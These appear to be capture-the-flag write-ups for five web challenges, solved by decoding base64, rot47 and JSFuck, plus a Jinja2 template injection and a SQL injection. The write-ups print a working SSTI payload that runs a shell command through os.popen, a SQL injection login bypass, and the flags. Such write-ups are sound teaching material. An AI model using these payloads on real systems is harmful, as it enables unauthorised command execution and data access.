# Inspector

```
We got information from our intel that the rival spy's web dev team has mistankingly left some critical information hidden on there website.

Your Mission - Extract the hidden info, decode the messages using your observation skills. Good Luck, Agent.

http://137.184.248.161
```

### Soln

- downloaded src code with `wget -r`

![image](https://github.com/heapbytes/tutelr-ctf-writeups/assets/56447720/1c5acab2-71ba-4040-88d6-2fb58a395fa2)

- found 3 parts
- after a while when i didn't get anything
- i ffuf'd the website and found `http://137.184.248.161/assets/robots.txt`
- 4th part:
    - ![image](https://github.com/heapbytes/tutelr-ctf-writeups/assets/56447720/a42ad079-0672-4750-a118-a98d860d7203)
      
- concating them & decoding with base64 gives us **flag**


# Hunting the Head

```
Whispers have been circulating on the streets that there is a high amount of traffic coming to a webpage from many ex-convicts. The local PD tried investigating the webpage but got nothing and recently the traffic on the webpage and drugs on the streets have increased exponentialy.

Mission - Find what the hell is going on asap, the streets are getting flooded by junkies.

http://206.189.155.222
```

### Soln

- the chall title was a hint
- saw headers
  
```bash
┌─[ ~/stuff/ctf/tutuelr/rev] [ 192.168.1.15]
└─➜ curl -vv http://206.189.155.222/                                                                                                                                                     [1]
*   Trying 206.189.155.222:80...
* Connected to 206.189.155.222 (206.189.155.222) port 80

<<--SNIPPED-->>

< Secret: EFE6=CL9bc50f_0f9b09bc5bCN
< Vary: Accept-Encoding
< Content-Length: 492
< Content-Type: text/html;charset=UTF-8
<<--SNIPPED-->>
```
- Secret: `EFE6=CL9bc50f_0f9b09bc5bCN`

- it's rot47

![image](https://github.com/heapbytes/tutelr-ctf-writeups/assets/56447720/c581e408-bf25-4ac9-8a93-abcbc88a62a0)

- Although it's half flag, we can guess the prefix

# Client Fuck

```
Today we got a call from Mr. Charlie ( your old partner ) who was investigating the japanese gang Oni Reapers. He send us a ip and a text file. The ip points to his database, but text file contains buch of gibrish in it. Well, he told us that his cover has been blown and he is going underground for sometime and also to give the ip and text file to you and you will know what to do.

http://157.245.148.142
```

### Soln

- The chall title was a hint, also if you open the given file you can tell it's js fuck lang
- https://www.dcode.fr/jsfuck-language
- intresting line:
    - `var expectedPassword1 = "a2V5IHRvIGZsYWc=";`

- base64 -d

![image](https://github.com/heapbytes/tutelr-ctf-writeups/assets/56447720/df9f6b82-83f8-4fb3-aa12-57d289fec579)

# SHELLing TEMPLATE

```
Yesterday our secure web communication channel was compromised by rival spies. The sever was put down and is now quarantined, we need this communication channel back running.

Mission - Find the vulnerability on the website.

http://167.172.7.17
```

### Soln

- the title was a hint
- ssti payloads : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
- Payload: (you can change and do ls to find flag location)
    - ```bash
      {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat secret/.flag.txt").read()}}{%endif%}{% endfor %}
        ```
      
![image](https://github.com/heapbytes/tutelr-ctf-writeups/assets/56447720/f47cebfe-351c-4e3d-be2a-0953366e2c04)



# Maria Inject

```
We have a encrypted key which you need to decrypt so we can use it to get the info about the last bombing case.

Encryption Info :- we got the encrypted file checked its aes-256-cbc encryption algorithm.

We were also able to snoop traffic and get a ip to a website which seems suspicious,
it might hold the secret for decrypting the key. 128.199.237.99

nc 157.245.148.142 12345
```

### Soln

- The chall title had a hint of sqli
- username : `admin' or 1=1-- -`, password: `this is commented anyway, so anything works`
- found a pass
  
```bash
Username: flag bearer
Special Password: keua4@8sjyyIa@76Tsjkk
```

- the desc had a hint of aes-256-cbc
- Tried it with the given file and it worked

```bash

└─➜ cat key.txt | base64                                                                                                                                                        [130]
U2FsdGVkX193Fuq6TnlXrXBNK7PNRq4TapDD7Q9mnbiLYiWAeYSOUGlKEBUXwRLh
```

![image](https://github.com/heapbytes/tutelr-ctf-writeups/assets/56447720/ca246b99-6cfe-42c8-a44d-aaf38d366c95)

- And now let's give this in the nc 

```bash
└─➜ nc 157.245.148.142 12345                                                                                                                                                             [1]

Enter the Key to Get the Info.

 [+] Input - y0uw0n7-b34bl370-6u355_m3
 [=] You got it right! Here is your flag - tutelr{5ql1_0n_7h3_m4r14db_f33l5_d1ff3r3n7}.

```



